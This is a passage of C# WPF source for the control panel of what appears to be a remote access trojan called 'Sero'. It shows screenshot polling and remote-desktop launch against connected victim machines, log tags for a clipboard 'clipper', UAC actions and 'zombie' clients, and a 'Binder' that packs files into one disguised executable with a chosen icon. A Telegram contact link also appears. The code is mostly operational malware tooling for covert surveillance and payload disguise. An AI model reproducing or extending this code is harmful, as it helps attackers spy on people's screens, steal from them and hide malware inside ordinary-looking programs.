            MessageBox.Show($"Import échoué : {ex.Message}", "Erreur", MessageBoxButton.OK, MessageBoxImage.Error);
        }
    }

    private void ExportCert_Click(object sender, RoutedEventArgs e)
    {
        try
        {
            var dialog = new Microsoft.Win32.SaveFileDialog
            {
                Filter = "PFX Certificate (*.pfx)|*.pfx",
                FileName = "sero_cert.pfx",
                Title = "Export TLS Certificate (cert only)"
            };

            if (dialog.ShowDialog() != true) return;

            CertificateHelper.ExportPfx(dialog.FileName);
            Log($"[+] Certificate exported to {dialog.FileName}");
            SetStatus("Certificate exported.");
            MessageBox.Show(
                $"Certificat exporté :\n{dialog.FileName}\n\nATTENTION : Ce fichier ne contient pas la clé d'auth.\nUtilisez 'Backup' pour exporter cert + clé d'auth ensemble.",
                "Sero — Export cert", MessageBoxButton.OK, MessageBoxImage.Warning);
        }
        catch (Exception ex)
        {
            Log($"[!] Export failed: {ex.Message}");
            MessageBox.Show($"Export failed: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
        }
    }

    private static string? PromptPassword(string message)
    {
        var dlg = new Window
        {
            Title = "Certificate Password",
            Width = 350, Height = 150,
            WindowStartupLocation = WindowStartupLocation.CenterScreen,
            ResizeMode = ResizeMode.NoResize,
            Background = new SolidColorBrush(Color.FromRgb(30, 30, 30))
        };
        var sp = new System.Windows.Controls.StackPanel { Margin = new Thickness(12) };
        sp.Children.Add(new System.Windows.Controls.TextBlock
        {
            Text = message, Foreground = Brushes.White, TextWrapping = TextWrapping.Wrap, Margin = new Thickness(0, 0, 0, 8)
        });
        var tb = new System.Windows.Controls.PasswordBox { Margin = new Thickness(0, 0, 0, 8) };
        sp.Children.Add(tb);
        var btn = new System.Windows.Controls.Button { Content = "OK", Width = 80, HorizontalAlignment = HorizontalAlignment.Right };
        string? result = null;
        btn.Click += (_, _) => { result = tb.Password; dlg.DialogResult = true; };
        sp.Children.Add(btn);
        dlg.Content = sp;
        tb.Focus();
        return dlg.ShowDialog() == true ? result : null;
    }

    // ── Logging ─────────────────────────────────────

    private void Log(string msg)
    {
        if (TxtLogs == null) return; // called before XAML init completes
        _logLineCount++;

        // Mirror to diagnostic file (never blocks UI — fire and forget)
        _ = Task.Run(() => DiagnosticLogger.Info(msg));

        if (_logLineCount > LogMaxLines)
        {
            // Trim: clear the RichTextBox document and start fresh.
            TxtLogs.Document.Blocks.Clear();
            _logPara = null;
            _logLineCount = 0;
            var trimNote = new System.Windows.Documents.Run("[...older logs trimmed...]\n")
            { Foreground = _brushLogDefault };
            var p = EnsureLogParagraph();
            p.Inlines.Add(trimNote);
        }

        var para = EnsureLogParagraph();
        foreach (var (text, brush) in TokenizeLogEntry(msg))
        {
            var run = new System.Windows.Documents.Run(text) { Foreground = brush };
            para.Inlines.Add(run);
        }
    }

    private bool _autoScrollLogs = true;
    private void TxtLogs_ScrollChanged(object sender, ScrollChangedEventArgs e)
    {
        // If the user scrolled up manually, turn off auto-scroll.
        if (e.ExtentHeightChange == 0 && e.ViewportHeightChange == 0 && e.VerticalChange != 0)
        {
            _autoScrollLogs = (TxtLogs.VerticalOffset + TxtLogs.ViewportHeight >= TxtLogs.ExtentHeight - 10);
        }

        // If content size increased, or viewport changed (e.g. tab became visible),
        // and auto-scroll is enabled, force scroll to end.
        if (_autoScrollLogs && (e.ExtentHeightChange > 0 || e.ViewportHeightChange > 0))
        {
            TxtLogs.ScrollToEnd();
        }
    }

    private static readonly System.Text.RegularExpressions.Regex _logTokenRegex = new(
        @"(?<ip>\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b)|(?<event>\b(?:connected|disconnected|failed|success|error)\b)|(?<client>\b(?:Client|client)\s+[A-Za-z0-9_-]+)|(?<user>\b[A-Za-z0-9_.-]+(?=@))",
        System.Text.RegularExpressions.RegexOptions.Compiled | System.Text.RegularExpressions.RegexOptions.IgnoreCase);
    private static readonly Brush _brushLogEvent = MakeBrush(0x60, 0xA5, 0xFA); // Blue
    private static readonly Brush _brushLogClient = MakeBrush(0xA7, 0x8B, 0xFA); // Purple
    private static readonly Brush _brushLogUser = MakeBrush(0x34, 0xD3, 0x99); // Emerald

    private IEnumerable<(string text, Brush brush)> TokenizeLogEntry(string msg)
    {
        // Timestamp part
        var now = DateTime.Now;
        string timeFmt = (UiPrefs.GetInt("ShowSeconds", 0) == 1) ? "h:mm:ss tt" : "h:mm tt";
        yield return ($"[{now.ToString(timeFmt)}] ", _brushLogTime);

        // Determine base brush for the message body
        var bodyBrush = GetLogBrush(msg);

        // Check for tags that should get their own color
        string body = msg;
        if (body.StartsWith("[!]"))
        {
            yield return ("[!]", _brushLogError);
            body = body[3..];
        }
        else if (body.StartsWith("[+]"))
        {
            yield return ("[+]", _brushLogSuccess);
            body = body[3..];
        }
        else if (body.StartsWith("[*]"))
        {
            yield return ("[*]", _brushLogSuccess);
            body = body[3..];
        }
        else if (body.StartsWith("[ADMIN]"))
        {
            yield return ("[ADMIN]", _brushLogAdmin);
            body = body[7..];
        }
        else if (body.StartsWith("[CLIPPER]"))
        {
            yield return ("[CLIPPER]", _brushLogTask);
            body = body[9..];
        }
        else if (body.StartsWith("[UAC]"))
        {
            yield return ("[UAC]", _brushLogTask);
            body = body[5..];
        }
        else if (body.StartsWith("[WATCHDOG]"))
        {
            yield return ("[WATCHDOG]", _brushLogError);
            body = body[10..];
        }
        else if (body.StartsWith("[RATE]"))
        {
            yield return ("[RATE]", _brushLogError);
            body = body[6..];
        }
        else if (body.StartsWith("[AUTH]"))
        {
            yield return ("[AUTH]", _brushLogError);
            body = body[6..];
        }
        else if (body.StartsWith("[LIMIT]"))
        {
            yield return ("[LIMIT]", _brushLogError);
            body = body[7..];
        }
        else if (body.StartsWith("[AT:"))
        {
            int end = body.IndexOf(']');
            if (end > 0)
            {
                yield return (body[..(end + 1)], _brushLogTask);
                body = body[(end + 1)..];
            }
        }
        else if (body.StartsWith("[-]"))
        {
            yield return ("[-]", _brushLogDisconnect);
            body = body[3..];
        }

        // Extract tokens (IP, Event, Client ID, Username) from the remaining body and color them
        int lastIdx = 0;
        foreach (System.Text.RegularExpressions.Match match in _logTokenRegex.Matches(body))
        {
            if (match.Index > lastIdx)
                yield return (body[lastIdx..match.Index], bodyBrush);

            Brush tokenBrush = bodyBrush;
            if (match.Groups["ip"].Success) tokenBrush = _brushLogIP;
            else if (match.Groups["event"].Success) tokenBrush = _brushLogEvent;
            else if (match.Groups["client"].Success) tokenBrush = _brushLogClient;
            else if (match.Groups["user"].Success) tokenBrush = _brushLogUser;

            yield return (match.Value, tokenBrush);
            lastIdx = match.Index + match.Length;
        }
        if (lastIdx < body.Length)
            yield return (body[lastIdx..], bodyBrush);

        yield return ("\n", _brushLogDefault);
    }

    private void LogAdminAction(string friendlyName, int clientCount, string firstClientId)
    {
        if (clientCount == 1)
        {
            Log($"[ADMIN] {friendlyName} opened for client {firstClientId}.");
        }
        else
        {
            Log($"[ADMIN] {friendlyName} opened for {clientCount} clients.");
        }
    }

    private void LogsTab_Selected()
    {
    }

    private System.Windows.Documents.Paragraph EnsureLogParagraph()
    {
        if (_logPara == null)
        {
            _logPara = new System.Windows.Documents.Paragraph { Margin = new Thickness(0) };
            TxtLogs.Document.Blocks.Add(_logPara);
        }
        return _logPara;
    }

    private static Brush GetLogBrush(string msg)
    {
        // 1. Error / Warning / Alarm
        if (msg.Contains("[!]") ||
            msg.Contains("[WATCHDOG]") || 
            msg.Contains("[RATE]") ||
            msg.Contains("[AUTH]") || 
            msg.Contains("[LIMIT]") ||
            msg.Contains("FAILED"))
        {
            return _brushLogError;
        }

        // 2. Admin Action
        if (msg.Contains("[ADMIN]"))
        {
            return _brushLogAdmin;
        }

        // 3. Client Connected
        if (msg.Contains("connected (") || msg.Contains("connected successfully"))
        {
            return _brushLogConnect;
        }

        // 4. Client Disconnected
        if (msg.Contains("disconnected.") || msg.Contains("disconnecting zombie"))
        {
            return _brushLogDisconnect;
        }

        // 5. Task Event / Operation / DLL
        if (msg.Contains("[CLIPPER]") ||
            msg.Contains("[AT:") ||
            msg.Contains("[UAC]") ||
            msg.Contains("dll", StringComparison.OrdinalIgnoreCase) ||
            msg.Contains("[DLL]"))
        {
            return _brushLogTask;
        }

        // 6. Success / General Info
        if (msg.Contains("[+]") || msg.Contains("[*]"))
        {
            return _brushLogSuccess;
        }

        return _brushLogDefault;
    }

    // ── Window Controls ─────────────────────────────

    private void Window_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
    {
        if (e.LeftButton == MouseButtonState.Pressed && !_isFullscreen && WindowState != WindowState.Maximized)
            DragMove();
    }

    protected override void OnStateChanged(EventArgs e)
    {
        base.OnStateChanged(e);
        if (WindowState == WindowState.Normal && _isFullscreen)
            _isFullscreen = false;
        bool big = WindowState == WindowState.Maximized || _isFullscreen;
        BtnFullscreen.Content = big ? "❐" : "☐";
        // Remove corner radius when filling the screen to avoid rounded black corners
        if (RootBorder != null)
            RootBorder.CornerRadius = WindowState == WindowState.Maximized
                ? new CornerRadius(0)
                : new CornerRadius(8);
    }

    private void Minimize_Click(object sender, RoutedEventArgs e) => WindowState = WindowState.Minimized;

    private WindowState _stateBeforeFullscreen;
    private double _widthBefore, _heightBefore, _leftBefore, _topBefore;
    private bool _isFullscreen;

    private void Fullscreen_Click(object sender, RoutedEventArgs e)
    {
        if (WindowState == WindowState.Maximized)
        {
            // OS-maximized (e.g. Win+↑ or Win+Ctrl+S) — just restore to Normal
            WindowState = WindowState.Normal;
            RootBorder.CornerRadius = new CornerRadius(8);
        }
        else if (_isFullscreen)
        {
            // Restore from our custom WorkArea fill
            _isFullscreen = false;
            WindowState = _stateBeforeFullscreen;
            Width  = _widthBefore;
            Height = _heightBefore;
            Left   = _leftBefore;
            Top    = _topBefore;
            RootBorder.CornerRadius = new CornerRadius(8);
        }
        else
        {
            // Save and fill WorkArea (keeps taskbar, no corner issues)
            _stateBeforeFullscreen = WindowState;
            _widthBefore  = Width;
            _heightBefore = Height;
            _leftBefore   = Left;
            _topBefore    = Top;
            WindowState = WindowState.Normal;
            var area = SystemParameters.WorkArea;
            Left   = area.Left;
            Top    = area.Top;
            Width  = area.Width;
            Height = area.Height;
            _isFullscreen = true;
            RootBorder.CornerRadius = new CornerRadius(0);
        }
    }

    // ── Native edge/corner resize via WM_NCHITTEST ──────────────────────────
    // Lets the OS handle resize — no visible grip needed.

    protected override void OnSourceInitialized(EventArgs e)
    {
        base.OnSourceInitialized(e);
        var src = System.Windows.Interop.HwndSource.FromHwnd(
            new System.Windows.Interop.WindowInteropHelper(this).Handle);
        src?.AddHook(NcHitTest);
    }

    private System.Windows.Media.Effects.DropShadowEffect? _savedShadow;
    private bool _resizing;

    private nint NcHitTest(nint hwnd, int msg, nint wParam, nint lParam, ref bool handled)
    {
        const int WM_NCHITTEST    = 0x0084;
        const int WM_ENTERSIZEMOVE = 0x0231;
        const int WM_EXITSIZEMOVE  = 0x0232;

        // Disable expensive effects while user drags — huge perf win with AllowsTransparency
        if (msg == WM_ENTERSIZEMOVE && !_resizing)
        {
            _resizing = true;
            _savedShadow = RootBorder.Effect as System.Windows.Media.Effects.DropShadowEffect;
            RootBorder.Effect = null;
            handled = false; return nint.Zero;
        }
        if (msg == WM_EXITSIZEMOVE && _resizing)
        {
            _resizing = false;
            RootBorder.Effect = _savedShadow;
            handled = false; return nint.Zero;
        }

        if (msg != WM_NCHITTEST || _isFullscreen || WindowState == WindowState.Maximized)
            return nint.Zero;

        int x = unchecked((short)(lParam.ToInt64() & 0xFFFF));
        int y = unchecked((short)((lParam.ToInt64() >> 16) & 0xFFFF));

        var dpi  = VisualTreeHelper.GetDpi(this);
        double l = Left   * dpi.DpiScaleX;
        double t = Top    * dpi.DpiScaleY;
        double r = (Left + Width)  * dpi.DpiScaleX;
        double b = (Top  + Height) * dpi.DpiScaleY;
        const double g = 8; // grip thickness in physical pixels

        bool atL = x < l + g, atR = x > r - g, atT = y < t + g, atB = y > b - g;

        if (atB && atR) { handled = true; return (nint)17; } // HTBOTTOMRIGHT
        if (atB && atL) { handled = true; return (nint)16; } // HTBOTTOMLEFT
        if (atT && atR) { handled = true; return (nint)14; } // HTTOPRIGHT
        if (atT && atL) { handled = true; return (nint)13; } // HTTOPLEFT
        if (atB)        { handled = true; return (nint)15; } // HTBOTTOM
        if (atR)        { handled = true; return (nint)11; } // HTRIGHT
        if (atL)        { handled = true; return (nint)10; } // HTLEFT
        if (atT)        { handled = true; return (nint)12; } // HTTOP
        return nint.Zero;
    }

    // ── Screen tab ─────────────────────────────────────────────────────────────

    private DispatcherTimer? _screenTimer;
    private DispatcherTimer? _screenFastTimer;
    private string? _focusedScreenId;
    private System.Threading.CancellationTokenSource? _screenFocusCancelCts;
    private readonly Dictionary<string, System.Windows.Controls.Image>  _screenTiles   = new();
    private readonly Dictionary<string, System.Windows.Controls.Border> _screenBorders = new();
    private readonly HashSet<string> _screenHandlers = new();

    // ── Binder ──────────────────────────────────────────────────────────
    private readonly ObservableCollection<SeroServer.Binder.BinderEntry> _binderEntries = [];
    private string? _binderIconPath;

    private void ScreenStart_Click(object sender, RoutedEventArgs e)
    {
        if (_server == null) return;
        BtnScreenStart.IsEnabled = false; BtnScreenStart.Opacity = 0.35;
        BtnScreenStop.IsEnabled  = true;  BtnScreenStop.Opacity  = 1.0;

        _screenTimer = new DispatcherTimer { Interval = TimeSpan.FromSeconds(3) };
        _screenTimer.Tick += (_, _) => RequestScreenshots();
        _screenTimer.Start();
        RequestScreenshots();
    }

    private void ScreenStop_Click(object sender, RoutedEventArgs e)
    {
        _screenTimer?.Stop(); _screenTimer = null;
        ClearScreenFocus();
        BtnScreenStart.IsEnabled = true;  BtnScreenStart.Opacity = 1.0;
        BtnScreenStop.IsEnabled  = false; BtnScreenStop.Opacity  = 0.35;
        foreach (var id in _screenHandlers.ToList())
            _server?.UnregisterHandler(id, PacketType.ScreenshotResult);
        _screenHandlers.Clear();
    }

    private void SetScreenFocus(string clientId)
    {
        if (_focusedScreenId == clientId) return;
        _focusedScreenId = clientId;
        _screenFastTimer?.Stop();
        _screenFastTimer = new DispatcherTimer { Interval = TimeSpan.FromMilliseconds(150) };
        _screenFastTimer.Tick += (_, _) => RequestFocusedScreenshot();
        _screenFastTimer.Start();
        RequestFocusedScreenshot();
    }

    private void ClearScreenFocus()
    {
        _focusedScreenId = null;
        _screenFastTimer?.Stop();
        _screenFastTimer = null;
    }

    private void RequestFocusedScreenshot()
    {
        if (_server == null || _focusedScreenId == null) return;
        if (!_server.ConnectedClients.ContainsKey(_focusedScreenId))
        {
            Dispatcher.BeginInvoke(ClearScreenFocus);
            return;
        }
        _ = _server.SendToClient(_focusedScreenId, new Packet { Type = PacketType.Screenshot });
    }

    private void RequestScreenshots()
    {
        if (_server == null) return;
        var clients = _server.ConnectedClients.Values.ToList();

        // Remove tiles for disconnected clients
        var ids = clients.Select(c => c.Id).ToHashSet();
        foreach (var key in _screenTiles.Keys.Where(k => !ids.Contains(k)).ToList())
        {
            if (key == _focusedScreenId) ClearScreenFocus();
            if (_screenTiles[key].Parent is System.Windows.FrameworkElement fe)
            {
                var panel = VisualTreeHelperGetParent(fe);
                if (panel is System.Windows.Controls.Primitives.UniformGrid ug) ug.Children.Remove(fe);
            }
            _screenTiles.Remove(key);
            _screenBorders.Remove(key);
        }

        foreach (var client in clients)
        {
            EnsureScreenTile(client);
            if (!_screenHandlers.Contains(client.Id))
            {
                var id = client.Id;
                _server.RegisterHandler(id, PacketType.ScreenshotResult,
                    pkt => OnScreenshotResult(id, pkt.Data));
                _screenHandlers.Add(id);
            }
            _ = _server.SendToClient(client.Id, new Packet { Type = PacketType.Screenshot });
        }
    }

    private static System.Windows.DependencyObject? VisualTreeHelperGetParent(
        System.Windows.DependencyObject obj)
        => System.Windows.Media.VisualTreeHelper.GetParent(obj);

    private double _tileImgHeight = 140;

    private void EnsureScreenTile(ConnectedClient client)
    {
        if (_screenTiles.ContainsKey(client.Id)) return;

        var img = new System.Windows.Controls.Image
        {
            Stretch = Stretch.Uniform,
            Height  = _tileImgHeight,
            HorizontalAlignment = HorizontalAlignment.Stretch
        };

        string displayName = !string.IsNullOrEmpty(client.Tag)
            ? client.Tag
            : string.IsNullOrEmpty(client.Username)
                ? client.Id
                : $"{client.Username}@{client.MachineName}".Trim('@');

        var lblName = new TextBlock
        {
            Text = displayName,
            Foreground = new SolidColorBrush(Color.FromRgb(0xCC, 0xD8, 0xFF)),
            FontSize = 10,
            Margin = new Thickness(6, 3, 6, 0),
            TextTrimming = System.Windows.TextTrimming.None,
            TextWrapping = System.Windows.TextWrapping.Wrap
        };

        var lblId = new TextBlock
        {
            Text = client.Id,
            Foreground = new SolidColorBrush(Color.FromRgb(0x50, 0x58, 0x70)),
            FontSize = 9,
            FontFamily = new System.Windows.Media.FontFamily("Consolas"),
            Margin = new Thickness(6, 1, 6, 4),
            TextTrimming = System.Windows.TextTrimming.None,
            TextWrapping = System.Windows.TextWrapping.NoWrap
        };

        var labelStack = new System.Windows.Controls.StackPanel { Orientation = System.Windows.Controls.Orientation.Vertical };
        labelStack.Children.Add(lblName);
        labelStack.Children.Add(lblId);

        var dp = new System.Windows.Controls.DockPanel();
        System.Windows.Controls.DockPanel.SetDock(labelStack, System.Windows.Controls.Dock.Bottom);
        dp.Children.Add(labelStack);
        dp.Children.Add(img);

        var border = new System.Windows.Controls.Border
        {
            Margin          = new Thickness(3),
            Background      = new SolidColorBrush(Color.FromRgb(0x07, 0x08, 0x12)),
            BorderBrush     = new SolidColorBrush(Color.FromRgb(0x1A, 0x1E, 0x36)),
            BorderThickness = new Thickness(1),
            CornerRadius    = new System.Windows.CornerRadius(5),
            Cursor          = System.Windows.Input.Cursors.Hand,
            Child           = dp,
        };

        // ── Hover highlight + click-to-popup ────────────────────────────────
        var capturedId    = client.Id;
        var capturedClient = client;

        border.MouseEnter += (_, _) =>
        {
            border.BorderBrush = new SolidColorBrush(Color.FromRgb(0x4A, 0x85, 0xF5));
            lblName.Foreground = new SolidColorBrush(Color.FromRgb(0xFF, 0xFF, 0xFF));
            System.Windows.Controls.Panel.SetZIndex(border, 10);
            _screenFocusCancelCts?.Cancel();
            _screenFocusCancelCts = null;
            SetScreenFocus(capturedId);
        };
        border.MouseLeave += (_, _) =>
        {
            border.BorderBrush = new SolidColorBrush(Color.FromRgb(0x1A, 0x1E, 0x36));
            lblName.Foreground = new SolidColorBrush(Color.FromRgb(0xCC, 0xD8, 0xFF));
            System.Windows.Controls.Panel.SetZIndex(border, 0);
            _screenFocusCancelCts?.Cancel();
            var cts = new System.Threading.CancellationTokenSource();
            _screenFocusCancelCts = cts;
            System.Threading.Tasks.Task.Delay(300, cts.Token).ContinueWith(t =>
            {
                if (!t.IsCanceled) Dispatcher.BeginInvoke(ClearScreenFocus);
            }, System.Threading.Tasks.TaskScheduler.Default);
        };
        border.MouseLeftButtonDown += (_, e) =>
        {
            e.Handled = true;
            if (_server?.ConnectedClients.ContainsKey(capturedId) != true) return;
            OpenFeatureWindow<RemoteDesktopWindow>(capturedId, () =>
            {
                var w = new RemoteDesktopWindow(_server!, capturedId);
                w.Owner = this;
                return w;
            });
        };

        ScreenPanel.Children.Add(border);
        _screenTiles[client.Id]   = img;
        _screenBorders[client.Id] = border;
    }

    private void ScreenScroll_Loaded(object sender, RoutedEventArgs e)
    {
        // SizeChanged fires with ViewportWidth=0 during the first layout pass and exits early.
        // Re-run after the layout is settled so tiles get their correct initial sizing.
        Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Background,
            () => ScreenScroll_SizeChanged(sender, null!));
    }

    private void ScreenScroll_SizeChanged(object sender, SizeChangedEventArgs e)
    {
        var sv = (System.Windows.Controls.ScrollViewer)sender;
        double avail = sv.ViewportWidth - 8 - 144; // 144 = 2×72px side margin (room for 1.45x scale overflow)
        if (avail <= 0) return;

        int cols = Math.Max(2, (int)(avail / 220));
        ScreenPanel.Columns = cols;

        double tileW = avail / cols - 6; // subtract tile margin
        double imgH  = Math.Round(tileW * 9.0 / 16.0);
        _tileImgHeight = imgH;

        foreach (var img in _screenTiles.Values)
            img.Height = imgH;
    }

    private void OnScreenshotResult(string clientId, string json)
    {
        try
        {
            var result = Newtonsoft.Json.JsonConvert.DeserializeObject<ScreenshotResultData>(json);
            if (result == null || string.IsNullOrEmpty(result.Data)) return;
            Dispatcher.BeginInvoke(() =>
            {
                try
                {
                    var bytes = Convert.FromBase64String(result.Data);
                    using var ms = new System.IO.MemoryStream(bytes);
                    var bmp = new System.Windows.Media.Imaging.BitmapImage();
                    bmp.BeginInit();
                    bmp.CacheOption = System.Windows.Media.Imaging.BitmapCacheOption.OnLoad;
                    bmp.StreamSource = ms;
                    bmp.EndInit();
                    bmp.Freeze();
                    if (_screenTiles.TryGetValue(clientId, out var img))
                        img.Source = bmp;
                }
                catch { }
            });
        }
        catch { }
    }

    // ── Binder handlers ─────────────────────────────────────────────────

    private void BtnBinderAdd_Click(object sender, RoutedEventArgs e)
    {
        var dlg = new Microsoft.Win32.OpenFileDialog
        {
            Title = "Ajouter des fichiers",
            Filter = "Tous les fichiers (*.*)|*.*",
            Multiselect = true
        };
        if (dlg.ShowDialog() != true) return;
        foreach (var path in dlg.FileNames)
        {
            var icon = BinderGetIcon(path);
            _binderEntries.Add(new SeroServer.Binder.BinderEntry
            {
                FilePath = path,
                FileSize = new FileInfo(path).Length,
                Icon     = icon
            });
        }
    }

    private void BtnBinderRemove_Click(object sender, RoutedEventArgs e)
    {
        if (BinderGrid.SelectedItem is SeroServer.Binder.BinderEntry entry)
        {
            if (MessageBox.Show($"Remove '{entry.FileName}' from the binder?", "Confirm", MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
            _binderEntries.Remove(entry);
        }
    }

    private void BtnBinderClearAll_Click(object sender, RoutedEventArgs e)
    {
        if (_binderEntries.Count == 0) return;
        if (MessageBox.Show($"Clear all {_binderEntries.Count} entries from the binder?", "Confirm", MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
        _binderEntries.Clear();
    }

    private void BtnBinderUp_Click(object sender, RoutedEventArgs e)
    {
        var idx = BinderGrid.SelectedIndex;
        if (idx > 0) _binderEntries.Move(idx, idx - 1);
    }

    private void BtnBinderDown_Click(object sender, RoutedEventArgs e)
    {
        var idx = BinderGrid.SelectedIndex;
        if (idx >= 0 && idx < _binderEntries.Count - 1) _binderEntries.Move(idx, idx + 1);
    }

    private void BtnBinderSelectIcon_Click(object sender, RoutedEventArgs e)
    {
        var dlg = new Microsoft.Win32.OpenFileDialog
        {
            Title  = "Source de l'icône",
            Filter = "Icône / Exécutable (*.ico;*.exe;*.dll)|*.ico;*.exe;*.dll|Tous (*.*)|*.*"
        };
        if (dlg.ShowDialog() != true) return;
        _binderIconPath = dlg.FileName;
        BinderIconPreview.Source = BinderGetIcon(_binderIconPath);
    }

    private void BtnBinderClearIcon_Click(object sender, RoutedEventArgs e)
    {
        _binderIconPath = null;
        BinderIconPreview.Source = null;
    }

    private async void BtnBinderBuild_Click(object sender, RoutedEventArgs e)
    {
        if (_binderEntries.Count == 0) { TxtBinderStatus.Text = "Aucun fichier."; return; }
        var dlg = new Microsoft.Win32.SaveFileDialog
        {
            Title      = "Enregistrer le binder",
            Filter     = "Exécutable (*.exe)|*.exe",
            DefaultExt = ".exe",
            FileName   = "output.exe"
        };
        if (dlg.ShowDialog() != true) return;
        var output = dlg.FileName;

        BtnBinderBuild.IsEnabled = false;
        TxtBinderStatus.Text = "Compilation…";

        var entries = _binderEntries.ToList();
        var icon    = _binderIconPath;
        var result  = await SeroServer.Binder.BinderBuilder.Build(
            entries, icon, output,
            msg => Dispatcher.BeginInvoke(() => TxtBinderStatus.Text = msg));

        BtnBinderBuild.IsEnabled = true;
        TxtBinderStatus.Text = result == "OK"
            ? $"✓ Compilé → {Path.GetFileName(output)}"
            : result;
    }

    [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential, CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
    private struct SHFILEINFO
    {
        public nint hIcon;
        public int  iIcon;
        public uint dwAttributes;
        [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.ByValTStr, SizeConst = 260)] public string szDisplayName;
        [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.ByValTStr, SizeConst = 80)]  public string szTypeName;
    }
    [System.Runtime.InteropServices.DllImport("shell32.dll", CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
    private static extern nint SHGetFileInfo(string pszPath, uint dwFileAttributes, ref SHFILEINFO psfi, uint cbFileInfo, uint uFlags);
    [System.Runtime.InteropServices.DllImport("user32.dll")]
    private static extern bool DestroyIcon(nint hIcon);

    private static System.Windows.Media.Imaging.BitmapSource? BinderGetIcon(string path)
    {
        try
        {
            var sfi = new SHFILEINFO();
            var res = SHGetFileInfo(path, 0, ref sfi,
                (uint)System.Runtime.InteropServices.Marshal.SizeOf<SHFILEINFO>(),
                0x100 | 0x1); // SHGFI_ICON | SHGFI_SMALLICON
            if (res == 0 || sfi.hIcon == 0) return null;
            try
            {
                // Render pixels immediately through System.Drawing before destroying HICON.
                // CreateBitmapSourceFromHIcon is lazy — the HICON must stay alive until pixels
                // are materialized, so we force a full copy via ToBitmap + BitmapCacheOption.OnLoad.
                using var drIcon = System.Drawing.Icon.FromHandle(sfi.hIcon);
                using var drBmp  = drIcon.ToBitmap();
                using var ms     = new System.IO.MemoryStream();
                drBmp.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
                ms.Position = 0;
                var bi = new System.Windows.Media.Imaging.BitmapImage();
                bi.BeginInit();
                bi.CacheOption  = System.Windows.Media.Imaging.BitmapCacheOption.OnLoad;
                bi.StreamSource = ms;
                bi.EndInit();
                bi.Freeze();
                return bi;
            }
            finally { DestroyIcon(sfi.hIcon); }
        }
        catch { return null; }
    }

    private static System.Windows.Media.ImageSource? TryLoadCameraIcon()
    {
        // Start Menu shortcuts are readable without admin — SHGetFileInfo follows the .lnk to the UWP icon
        var startMenuDirs = new[]
        {
            Environment.GetFolderPath(Environment.SpecialFolder.CommonPrograms),
            Environment.GetFolderPath(Environment.SpecialFolder.Programs),
        };
        foreach (var dir in startMenuDirs)
        {
            var lnk = Path.Combine(dir, "Camera.lnk");
            if (File.Exists(lnk)) { var ico = ShellIcon.GetFromPath(lnk); if (ico != null) return ico; }
        }
        // WindowsApps direct (requires admin on most systems)
        try
        {
            var appsDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "WindowsApps");
            if (Directory.Exists(appsDir))
            {
                var camDir = Directory.GetDirectories(appsDir, "Microsoft.WindowsCamera_*").FirstOrDefault();
                if (camDir != null)
                {
                    var exe = Path.Combine(camDir, "Camera.exe");
                    if (File.Exists(exe)) return ShellIcon.GetFromPath(exe);
                }
            }
        }
        catch { }
        return null;
    }

    private static System.Windows.Media.ImageSource MakeMicIcon()
    {
        var pink = new System.Windows.Media.SolidColorBrush(
            System.Windows.Media.Color.FromRgb(0xF3, 0x8B, 0xA8));
        var pen = new System.Windows.Media.Pen(pink, 1.3)
        {
            StartLineCap = System.Windows.Media.PenLineCap.Round,
            EndLineCap   = System.Windows.Media.PenLineCap.Round
        };
        // U-shaped stand arc
        var arc = new System.Windows.Media.PathGeometry();
        var fig = new System.Windows.Media.PathFigure { StartPoint = new System.Windows.Point(3, 6), IsClosed = false };
        fig.Segments.Add(new System.Windows.Media.QuadraticBezierSegment(
            new System.Windows.Point(8, 13), new System.Windows.Point(13, 6), true));
        arc.Figures.Add(fig);
        var dg = new System.Windows.Media.DrawingGroup();
        using (var ctx = dg.Open())
        {
            // Capsule body
            ctx.DrawRoundedRectangle(pink, null, new System.Windows.Rect(5, 1, 6, 7), 3, 3);
            // Stand arc
            ctx.DrawGeometry(null, pen, arc);
            // Pole + base
            ctx.DrawLine(pen, new System.Windows.Point(8, 11), new System.Windows.Point(8, 14));
            ctx.DrawLine(pen, new System.Windows.Point(5, 14), new System.Windows.Point(11, 14));
        }
        var img = new System.Windows.Media.DrawingImage(dg);
        img.Freeze();
        return img;
    }

    private void Close_Click(object sender, RoutedEventArgs e)
    {
        _screenTimer?.Stop();
        _server?.Stop();
        NotificationService.Shutdown();
        Application.Current.Shutdown();
    }

    private void TelegramLink_Click(object sender, RoutedEventArgs e)
    {
        System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
        {
            FileName = "https://t.me/serotohnine",
            UseShellExecute = true
        });
    }

    private void MainTabControl_SelectionChanged(object sender, SelectionChangedEventArgs e)
    {
        if (!ReferenceEquals(e.OriginalSource, MainTabControl)) return;
        if (e.AddedItems.Count == 0) return;

        if (e.AddedItems[0] is not System.Windows.Controls.TabItem ti) return;

        // Clear log badge when user switches to the Logs tab
        if (ReferenceEquals(ti, LogsTabItem))
            LogsTab_Selected();

        // Auto-stop screen streaming when navigating away from the Screen tab
        if (!ReferenceEquals(ti, ScreenTabItem) && _screenTimer != null)
            ScreenStop_Click(this, null!);

        // Re-run tile sizing when switching to Screen tab — viewport may have changed
        // while a different tab was active (SizeChanged fires with stale size on hidden tabs).
        if (ReferenceEquals(ti, ScreenTabItem))
            Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Loaded,
                () => ScreenScroll_SizeChanged(ScreenScroll, null!));

        var presenter = MainTabControl.Template?.FindName("PART_SelectedContentHost", MainTabControl) as ContentPresenter;
        if (presenter == null) return;

        // Fade-in only — BlurEffect removed: WPF BlurEffect uses DirectX pixel shaders that
        // cause colored rendering artifacts in Hyper-V (synthetic display adapter doesn't
        // support the intermediate render targets WPF bitmap effects require).
